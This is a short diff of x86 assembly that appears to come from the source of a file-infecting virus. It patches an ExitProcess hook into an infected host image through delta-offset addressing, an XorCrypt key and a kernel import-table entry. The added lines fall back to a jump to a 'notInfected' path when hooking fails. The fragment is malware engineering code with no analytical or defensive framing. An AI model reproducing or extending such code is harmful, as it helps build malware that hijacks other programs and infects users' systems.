@@ -50,6 +50,10 @@ mov	[DELTA XorCrypt], eax
 ; PATCH HOOK EXIT PROCESS
 mov	edi, offset hookExitProcess
 add	edi, ebp
+; Check if hooking possible
+cmp	[DELTA VAKernelIAT], 0
+je	patchNotHook
+; Hook
 mov	eax, 0B8h ; mov eax, imm32
 stosb
 mov	eax, [DELTA BaseImage]
@@ -66,10 +70,14 @@ mov	eax, 0008Bh ; mov eax, [eax]
 stosw
 mov	eax, 0C803h ; add ecx, eax
 stosw
-; mov	eax, 001C7h ; mov [ecx], imm32
-; stosw
-; mov	eax, 042424242h ; Hook Function
-; stosd
+jmp	endPatchHook
+; Failed
+patchNotHook:
+mov	eax, 0EBh ; Jmp rel8
+stosb
+mov	eax, notInfected - hookExitProcess - 2
+stosb
+endPatchHook:
 
 
 
